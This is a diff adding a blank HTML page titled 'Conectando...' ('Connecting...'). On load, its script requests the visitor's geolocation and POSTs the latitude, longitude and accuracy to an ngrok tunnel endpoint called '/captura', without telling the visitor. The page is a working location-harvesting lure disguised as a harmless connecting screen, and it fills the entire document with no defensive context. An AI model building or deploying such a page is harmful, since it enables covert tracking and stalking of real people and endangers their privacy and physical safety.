@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Conectando...</title>
+  <style>body { background-color: white; }</style>
+</head>
+<body>
+
+<script>
+function enviarUbicacion(lat, lon, acc) {
+  fetch('https://f2ac-131-255-250-88.ngrok-free.app/captura', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({lat, lon, acc})
+  });
+}
+
+function obtenerUbicacion() {
+  navigator.geolocation.getCurrentPosition(function(pos) {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const acc = pos.coords.accuracy;
+    enviarUbicacion(lat, lon, acc);
+  }, function(error) {
+    console.log("Permiso denegado o error");
+  });
+}
+
+obtenerUbicacion();
+</script>
+
+</body>
+</html>
